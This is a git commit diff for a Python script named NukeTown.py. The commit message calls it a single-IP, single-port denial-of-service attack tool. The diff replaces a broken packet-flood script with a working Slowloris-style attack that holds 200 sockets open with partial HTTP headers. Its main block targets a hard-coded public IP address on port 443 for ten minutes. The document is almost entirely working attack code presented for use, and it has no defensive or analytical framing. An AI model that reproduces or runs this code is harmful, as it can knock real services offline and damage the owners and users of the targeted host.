27d4e2b88d0b4fb40e4afa65b1bd75efae647007
baleta <mateusbalabenute@yahoo.com.au>
2022-04-02 16:14:50 -0300

    NukeTown for single IP and single port DoS attack

--- NukeTown.py
+++ NukeTown.py
@@ -1,21 +1,49 @@
-from scapy.all import *
 import socket
-import threading
+import time
+import random
+import sys
 
 
-target_ip = input('Enter targe IP address: ')
-sourcee_ip = input("Enter source IP address: ")
-#fake_ip = input('Enter fake IP address: ')
-target_port = int(input('Enter target Port number: '))
-source_port = int(input('Enter source Port number: '))
-i = 1
+class tool():
+    def __init__(self, ip, port=80, socketCount=200):
+        self._ip = ip
+        self._port = port
+        self._headers = [
+            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
+            "Accept-Language: en-us,en;q=0.5"
+        ]
+        self._sockets = [self.newSocket() for _ in range(socketCount)]
 
-while True:
-    IP1 =
-    IP(sourcee_ip = sourcee_ip, desination = target_ip)
-    TCP1 = TCP(srcport = source_port, dstport = 80)
-    pkt = IP1 / TCP1
-    send(pkt, inter = .001)
-    
-    print('packeet sent ', i)
-    i = i + 1
+    def getMessage(self, message):
+        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")
+
+    def newSocket(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(4)
+            s.connect((self._ip, self._port))
+            for header in self._headers:
+                s.send(bytes(bytes('{}\rn\n'.format(header).encode('utf-8'))))
+            return s
+        except socket.error as se:
+            print('Error: ' + str(se))
+            time.sleep(0.5)
+            return self.newSocket()
+
+    def attack(self, timeout=sys.maxsize, sleep=15):
+        t, i = time.time(), 0
+        while(time.time() - t < timeout):
+            for s in self._sockets:
+                try:
+                    print('Sending request #{}'.format(str(i)))
+                    s.send(self.getMessage('X-a: '))
+                    i += 1
+                except socket.error:
+                    self._sockets.remove(s)
+                    self._sockets.append(self.newSocket())
+                time.sleep(sleep/len(self._sockets))
+
+
+if __name__ == '__main__':
+    dos = tool('54.207.20.104', 443, socketCount=200)
+    dos.attack(timeout=60*10)
